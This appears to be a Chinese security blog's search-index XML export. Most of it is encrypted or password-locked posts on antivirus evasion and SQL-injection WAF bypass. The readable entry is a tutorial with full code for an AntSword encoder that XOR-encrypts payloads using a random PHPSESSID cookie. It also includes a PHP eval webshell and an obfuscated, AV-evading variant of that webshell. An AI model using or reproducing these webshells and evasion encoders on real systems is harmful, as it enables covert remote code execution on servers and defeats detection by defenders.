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]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(二)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-2%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(一)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-1%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于随机Cookie的蚁剑动态秘钥编码器]]></title>
    <url>%2Fposts%2Fantsword-xor-encoder-2%2F</url>
    <content type="text"><![CDATA[前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。但是在实际使用的过程中还是会出现各种各样的玄学BUG，导致利用失败，我个人不是特别满意。研究了一下蚁剑编码器的ext参数后，决定采用利用随机Cookie来产生随机秘钥的方式。正文编码器的ext参数本来一直等蚁剑作者写编码器的第三篇，结果一直没等到。。。算了还是自己研究一下吧首先新建一个编码器，名字叫test吧加入一行console.log(ext.opts.httpConf);然后随便连接一个shell，打开开发者工具，可以看到已经打印出了我们所需要的信息包括shell请求的body跟headers头抓包看一下，headers头的结果跟抓包的结果是一致的那么我们能否从编码器中修改headers头呢我们在编码器中加入一行1ext.opts.httpConf.headers[&apos;User-Agent&apos;]=&apos;yzddMr6&apos;;可以看到我们已经成功修改了shell中UA的值。同理，我们也可以在编码器中对其他header头或者body进行修改。随机生成Cookie既然我们已经可以任意修改shell的请求信息，我们就可以把秘钥放在一个指定的headers字段里，shell获取后再对payload进行加解密。但是突然多出来一个奇奇怪怪的字段，长时间后就会变成waf识别的特征。那么有没有什么是变化的，并且很常见的headers头呢？我们就可以想到利用Cookie。参考蚁剑的aes编码器，它所采用的方法是人工首先访问shell生成一个sessionid，填入shell配置后作为后面通讯的秘钥。但是实际上因为我们已经可以控制cookie字段，我们完全可以在编码器中每次生成一个随机的cookie，这样就省去了人工操作的一步。有一个坑要注意，php的session id一般是26位的，所以我们最好也生成一个26位的秘钥，增强伪装性。（虽然可能并没有什么卵用）具体实现编码器12345678910111213141516171819202122232425&apos;use strict&apos;;//code by yzddmr6module.exports = (pwd, data, ext = &#123;&#125;) =&gt; &#123; let randomID = `x$&#123;Math.random().toString(16).substr(2)&#125;`; function xor(payload) &#123; let crypto = require(&apos;crypto&apos;); let key = crypto.createHash(&apos;md5&apos;).update(randomID).digest(&apos;hex&apos;).substr(6); ext.opts.httpConf.headers[&apos;Cookie&apos;] = &apos;PHPSESSID=&apos; + key; key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); //let payload=&quot;phpinfo();&quot;; let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for (let i = 0; i &lt; cipher.length; i++) &#123; cipher[i] = cipher[i] ^ key[i % 26] &#125; cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&quot;&quot;) cipher = Buffer.from(cipher).toString(&apos;base64&apos;); //console.log(cipher) return cipher; &#125; data[&apos;_&apos;] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); data[pwd] = `eval(base64_decode(&quot;$&#123;data[&apos;_&apos;]&#125;&quot;));`; data[pwd]=xor(data[pwd]); delete data[&apos;_&apos;]; return data;&#125;Shell原型12345678&lt;?php@$post=base64_decode($_REQUEST[&apos;test&apos;]);$key=@$_COOKIE[&apos;PHPSESSID&apos;];for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%26];&#125;@eval($post);?&gt;免杀处理1234567891011121314151617&lt;?phpclass Cookie&#123; function __construct() &#123; $key=@$_COOKIE[&apos;PHPSESSID&apos;]; @$post=base64_decode($_REQUEST[&apos;test&apos;]); for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%26]; &#125; return $post; &#125; function __destruct() &#123;return @eval($this-&gt;__construct());&#125;&#125;$check=new Cookie();?&gt;连接测试最后还是老问题，蚁剑的其他参数只是一层base64，这个就需要大家自己手工去改了。蚁剑牛逼！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]SQL注入万能Bypass]]></title>
    <url>%2Fposts%2Fbypass-waf-sqlin%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! 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